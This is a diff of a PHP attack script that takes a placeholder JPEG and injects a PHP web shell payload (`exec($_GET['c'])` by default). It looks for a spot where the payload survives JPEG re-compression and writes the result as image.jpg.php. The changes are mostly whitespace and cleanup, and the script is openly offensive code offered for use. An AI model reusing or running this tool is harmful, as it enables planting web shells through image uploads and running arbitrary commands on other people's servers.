@@ -30,18 +30,20 @@ $quality = isset($argv[3]) && is_numeric($argv[3]) && $argv[3] <= 100 ? $argv[3]
 $code = isset($argv[4]) ? $argv[4 ] : '<?=exec($_GET["c"])?>';
 $orig = 'image.jpg';
 $base_url = "http://placekitten.com";
- 
+
 do
 {
     $url = $base_url . "/$width/$height/";
- 
+    
     echo "[+] Fetching image ($width X $height) from $url\n";
     file_put_contents($orig, file_get_contents($url));
 } while(!tryInject($orig, $code, $quality));
- 
+
 echo "[+] Done\n";
 echo "[+] Result file: image.jpg.php\n";
- 
+
+unlink($orig);
+
 function tryInject($orig, $code, $quality)
 {
     $result_file = 'image.jpg.php';
@@ -56,7 +58,7 @@ function tryInject($orig, $code, $quality)
 
     echo "[+] Jumping to end byte\n";
     $start_byte = findStart($data);
- 
+    
     echo "[+] Searching for valid injection point\n";
     for($i = strlen($data)-1; $i > $start_byte; --$i)
     {
@@ -65,21 +67,21 @@ function tryInject($orig, $code, $quality)
         {
             $tmpData[$n] = $code[$z];
         }
- 
+        
         $src = imagecreatefromstring($tmpData);
         imagejpeg($src, $result_file, $quality);
- 
+        
         if(checkCodeInFile($result_file, $code))
         {
             unlink($tmp_filename);
             unlink($result_file);
             sleep(1);
- 
+            
             file_put_contents($result_file, $tmpData);
- 
+            
             sleep(1);
             $src = imagecreatefromjpeg($result_file);
- 
+            
             return true;
         }
         else
@@ -87,11 +89,11 @@ function tryInject($orig, $code, $quality)
             unlink($result_file);
         }
     }
-        unlink($orig);
-        unlink($tmp_filename);
-        return false;
+    
+    unlink($tmp_filename);
+    return false;
 }
- 
+
 function findStart($str)
 {
     for($i = 0; $i < strlen($str); ++$i)
@@ -101,10 +103,10 @@ function findStart($str)
             return $i+2;
         }
     }
- 
+    
     return -1;
 }
- 
+
 function checkCodeInFile($file, $code)
 {
     if(file_exists($file))
@@ -115,15 +117,15 @@ function checkCodeInFile($file, $code)
     {
         $contents = "0";
     }
- 
+    
     return strstr($contents, $code);
 }
- 
+
 function loadFile($file)
 {
     $handle = fopen($file, "r");
     $buffer = fread($handle, filesize($file));
     fclose($handle);
- 
+    
     return $buffer;
 }
